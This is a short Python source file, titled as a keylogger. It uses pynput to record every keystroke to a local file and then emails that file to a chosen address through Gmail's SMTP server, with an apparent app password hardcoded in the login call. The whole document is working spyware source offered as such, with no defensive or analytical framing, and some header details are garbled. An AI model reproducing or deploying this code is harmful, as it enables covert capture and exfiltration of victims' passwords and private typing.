# Keylogger written in python

from pynput import keyboard

import logging, atexit, smtplib, time

from email.mime.text import MIMEText

from email.mime.multipart import MIMEMultipart

from email.mime.application import MIMEApplication

logging.basicConfig(filename=("p4.txt"), level=logging.INFO)

def on_press(key):
    logging.info(key)

keyboard_listener = keyboard.Listener(on_press=on_press)
keyboard_listener.start()


fromaddr = "sender email" #email that sends the file

toaddr = "recpient" #email that receives the file

msg = MIMEMultipart()

msg['From'] = fromaddr

msg['To'] = toaddr

msg['Subject'] = "Test Mail"

body = "testing"

msg.attach(MIMEText(body, 'plain'))

attach_file_name = 'p4.txt'

attach_file = open(attach_file_name, 'rb')

payload = MIMEMultipart('application', 'octate-stream')

payload.set_payload((attach_file).read())

payload.add_header('Content-Decomposition', 'attachment', filename=attach_file_name)

msg.attach(payload)

server = smtplib.SMTP('smtp.gmail.com', 587)

server.connect("smtp.gmail.com",587)

server.ehlo()

server.starttls()

server.ehlo()

server.login(fromaddr, "nwjuxouwxcgnklee")

text = msg.as_string()

server.sendmail(fromaddr, toaddr, text)

server.quit()

keyboard_listener.join()
